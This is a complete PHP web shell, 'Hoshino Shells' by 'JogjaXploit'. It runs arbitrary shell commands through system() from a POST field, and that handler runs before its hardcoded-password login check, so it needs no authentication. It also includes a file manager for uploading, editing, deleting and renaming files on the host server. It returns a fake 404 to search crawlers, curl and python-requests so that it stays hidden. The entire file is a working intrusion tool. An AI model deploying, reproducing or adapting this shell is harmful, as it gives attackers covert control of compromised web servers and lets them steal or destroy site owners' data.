<?php
session_start();
ob_start(); // Memulai output buffering

$validUsername = 'JogjaXploit';
$validPassword = 'Djaya3';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command_remote'])) {
    $command_remote = $_POST['command_remote'];
    $target_dir = isset($_POST['target_dir']) ? $_POST['target_dir'] : '.';

    // Validasi direktori agar aman
    if (is_dir($target_dir)) {
        chdir($target_dir);
    }

    echo "Current Directory: " . getcwd() . "<br><br>";

    // Eksekusi perintah di direktori yang dipilih
    echo "<pre>";
    system(($command_remote) . " 2>&1");
    echo "</pre>";

    echo "<a href=''>Back</a>";
    die;
}

$blockedUserAgents = [
    'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
    'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
    'YahooSeeker', 'bingbot', 'curl', 'python-requests/2.25.1', 'python-requests/2.31.0', 'python-requests',
    'exabot', 'Applebot', 'duckduckbot', 'facebot', 'Alexa Crawler'
];

$userAgent = $_SERVER['HTTP_USER_AGENT'];

foreach ($blockedUserAgents as $blockedUserAgent) {
    if (stripos($userAgent, $blockedUserAgent) !== false) {
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit;
    }
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<div style="color: red;">Invalid username or password.</div>';
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    echo '<div class="container">';
    echo '<h1>Login</h1>';
    echo '<form method="post">';
    echo 'Username: <input type="text" name="username"><br>';
    echo 'Password: <input type="password" name="password"><br>';
    echo '<input type="submit" value="Login" class="button">';
    echo '</form>';
    echo '</div>';
    exit;
}

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$path = isset($_GET['path']) ? $_GET['path'] : $_SERVER['DOCUMENT_ROOT'];
$action = isset($_GET['action']) ? $_GET['action'] : null;
$command_remote = isset($_POST['command_remote']) ? $_POST['command_remote'] : '';
$file = isset($_GET['file']) ? $_GET['file'] : '';

echo '<div><strong>Root Directory:</strong> ' . $_SERVER['DOCUMENT_ROOT'] . '</div>';

function getPermissions($file) {
    $perms = fileperms($file);
    $info = '';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function listDirectory($path) {
    $dir = scandir($path);
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Action</th></tr>';
    if ($path !== $_SERVER['DOCUMENT_ROOT']) {
        echo '<tr><td colspan="4"><a href="?path=' . urlencode(dirname($path)) . '">Go to previous dir</a></td></tr>';
    }
    foreach ($dir as $item) {
        if ($item == '.' || $item == '..') continue;
        $filePath = $path . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($filePath);
        $size = $isDir ? 'N/A' : filesize($filePath);
        $permissions = getPermissions($filePath);
        echo '<tr>';
        echo '<td>' . ($isDir ? '<a href="?path=' . urlencode($filePath) . '">' . $item . '</a>' : $item) . '</td>';
        echo '<td>' . ($isDir ? 'N/A' : $size) . '</td>';
        echo '<td>' . ($isDir ? '-' : $permissions) . '</td>';
        echo '<td>';
        if (!$isDir) {
            echo '<a href="?action=edit&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Edit</a> ';
            echo '<a href="?action=delete&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Delete</a> ';
            echo '<a href="?action=rename&file=' . urlencode($filePath) . '&path=' . urlencode($path) . '">Rename</a>';
        }
        if ($isDir) {
            foreach (['delete' => 'Delete', 'rename' => 'Rename'] as $action => $label) {
                echo "<a href='?action=$action&dir=" . urlencode($filePath) . "&path=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin $label folder ini?\")'>$label</a> ";
            }
        }
        echo '</td>';
        echo '</tr>';
    }
    echo '</table>';
}

function uploadFile($path) {
    if (isset($_FILES['uploaded_file'])) {
        $target_dir = $path . DIRECTORY_SEPARATOR;
        $target_file = $target_dir . basename($_FILES['uploaded_file']['name']);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if file already exists
        if (file_exists($target_file)) {
            echo 'Sorry, file already exists. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
            $uploadOk = 0;
        }

        // Check if $uploadOk is set to 0 by an error
        if ($uploadOk == 0) {
            echo 'Sorry, your file was not uploaded. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
        } else {
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_file)) {
                echo "The file " . htmlspecialchars(basename($_FILES['uploaded_file']['name'])) . ' has been uploaded. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
            } else {
                echo 'Sorry, there was an error uploading your file. <a href="?path=' . urlencode($target_dir) . '">Go back</a>';
            }
        }
    }
}

function createNewFolder($path, $folderName) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0777, true);
        echo 'Folder "' . htmlspecialchars($folderName) . '" created successfully. <a href="?path=' . urlencode($path) . '">Go back</a>';
    } else {
        echo 'Folder "' . htmlspecialchars($folderName) . '" already exists. <a href="?path=' . urlencode($path) . '">Go back</a>';
    }
}

function createNewFile($path, $fileName) {
    $newFile = $path . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($newFile)) {
        $fp = fopen($newFile, 'w');
        fclose($fp);
        echo 'File ' . htmlspecialchars($fileName) . ' created successfully. <a href="?path=' . urlencode($path) . '">Go back</a>';
    } else {
        echo 'File ' . htmlspecialchars($fileName) . ' already exists. <a href="?path=' . urlencode($path) . '">Go back</a>';
    }
}

// Proses delete folder beserta isinya
if ($action === 'delete' && isset($_GET['dir'])) {
    function deleteFolder($folder) {
        foreach (scandir($folder) as $item) {
            if ($item == '.' || $item == '..') continue;
            $path = "$folder/$item";
            is_dir($path) ? deleteFolder($path) : unlink($path);
        }
        rmdir($folder);
    }
    deleteFolder($_GET['dir']);
    header("Location: ?path=" . urlencode($_GET['path']));
    exit;
}

// Proses rename folder
if ($action === 'rename' && isset($_GET['dir'])) {
    echo "<form method='post'>
            <input type='text' name='new_name' placeholder='Nama baru' required>
            <button type='submit' name='rename'>Rename</button>
          </form>";
    if (isset($_POST['rename'])) {
        $newPath = dirname($_GET['dir']) . '/' . basename($_POST['new_name']);
        rename($_GET['dir'], $newPath);
        header("Location: ?path=" . urlencode($_GET['path']));
        exit;
    }
}

// Handle actions
if ($action === 'upload') {
    uploadFile($path);
    exit;
}

if ($action === 'create_folder') {
    if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        createNewFolder($path, $_POST['folder_name']);
    } else {
        echo 'Folder name cannot be empty. <a href="?path=' . urlencode($path) . '">Go back</a>';
    }
    exit;
}

if ($action === 'create_file') {
    if (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        createNewFile($path, $_POST['file_name']);
    } else {
        echo 'File name cannot be empty. <a href="?path=' . urlencode($path) . '">Go back</a>';
    }
    exit;
}

if ($action === 'edit' && !empty($file)) {
    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo 'File saved! <a href="?path=' . urlencode(dirname($file)) . '">Go back</a>';
    } else {
        $content = file_get_contents($file);
        echo '<body>';
        echo '<h1>Edit File: ' . basename($file) . '</h1>';
        echo '<form method="post">';
        echo '<textarea name="content" rows="40" cols="175">' . htmlspecialchars($content) . '</textarea><br>';
        echo '<input type="submit" value="Save">';
        echo '</form>';
        echo '<a href="?path=' . urlencode($path) . '">Cancel</a>';
        echo '</body>';
    }
    exit;
}

if ($action === 'delete' && !empty($file)) {
    if (is_file($file)) {
        unlink($file);
        echo 'File deleted! <a href="?path=' . urlencode($path) . '">Go back</a>';
    } else {
        echo 'Invalid file. <a href="?path=' . urlencode($path) . '">Go back</a>';
    }
    exit;
}

if ($action === 'rename' && !empty($file)) {
    if (isset($_POST['new_name'])) {
        $newName = dirname($file) . DIRECTORY_SEPARATOR . $_POST['new_name'];
        rename($file, $newName);
        echo 'File renamed! <a href="?path=' . urlencode($path) . '">Go back</a>';
    } else {
        echo '<h1>Rename File: ' . basename($file) . '</h1>';
        echo '<form method="post">';
        echo '<input type="text" name="new_name" value="' . basename($file) . '"><br>';
        echo '<input type="submit" value="Rename">';
        echo '</form>';
        echo '<a href="?path=' . urlencode($path) . '">Cancel</a>';
    }
    exit;
}
ob_end_flush();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Hoshino Shells!.</title>
    <style>
        body {
            font-family: 'Courier New', monospace, sans-serif;
            background-color: #2b2b2b;
            color: #f8f8f2;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
            overflow: auto, hidden; /* Memastikan konten tetap bisa di-scroll */
            scrollbar-width: none; /* Untuk browser Firefox */
            -ms-overflow-style: none; /* Untuk browser Internet Explorer dan Edge */
        }

        .editor-container {
            display: flex;
            border: 1px solid #555;
            border-radius: 12px;
            overflow: hidden;
            width: 80%;
            max-width: 900px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5);
        }

        .line-numbers {
            background: #1e1e1e;
            padding: 12px 8px;
            text-align: right;
            color: #888;
            user-select: none;
            overflow: hidden;
        }

        textarea {
            flex: 1;
            padding: 12px;
            border: none;
            outline: none;
            font-family: monospace;
            background: #2e2e2e;
            color: #fff;
            resize: none;
            line-height: 1.5;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-thumb {
            background: #555;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-track {
            background: #333;
        }
        
        h1 {
            color:rgb(255, 108, 211);
        }
        .action-buttons {
            float: right;
            margin-bottom: 20px; /* Add margin to separate from the content below */
        }
        img {
            display: block;
            margin-top: 20px; /* Add margin to separate the image from the title */
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #4CAF50;
            color: white;
        }
        tr:nth-child(even) {
            background-color:rgb(78, 78, 78);
        }
        tr:hover {
            background-color:rgb(31, 31, 31);
        }
        a {
            color:rgb(52, 175, 93);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        form {
            margin-top: 20px;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .action-buttons {
            float: right;
        }
    </style>
</head>
<body>
    <h1>Hoshino Shells - By MrSanZz. JogjaXploit</h1>

    <!-- Action Buttons -->
    <div class="action-buttons">
        <!-- Upload File Form -->
        <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($path); ?>">
            <input type="file" name="uploaded_file">
            <input type="submit" value="Upload File">
        </form>

        <!-- Create New Folder Form -->
        <form method="post" action="?action=create_folder&path=<?php echo urlencode($path); ?>">
            <input type="text" name="folder_name" placeholder="New Folder Name">
            <input type="submit" value="Create Folder">
        </form>

        <!-- Create New File Form -->
        <form method="post" action="?action=create_file&path=<?php echo urlencode($path); ?>">
            <input type="text" name="file_name" placeholder="New File Name">
            <input type="submit" value="Create File">
        </form>

        <!-- Create New File Form -->
        <form method="post" action="?path=<?php echo urlencode($path); ?>">
            <input type="text" name="command_remote" placeholder="Remote Command">
            <input type="submit" value="Execute Command">
        </form>
    </div>

    <!-- Image -->
    <img src="https://images-ng.pixai.art/images/orig/186021c2-a85f-44ba-80c8-72b747d82fbe" alt="My Honey~ 🥰" height="300" width="300">

    <!-- File Listing -->
    <div>
        <?php echo '<h2>Directory:</h2>'.$path; ?>
        <?php listDirectory($path); ?>
    </div>
</body>
</html>
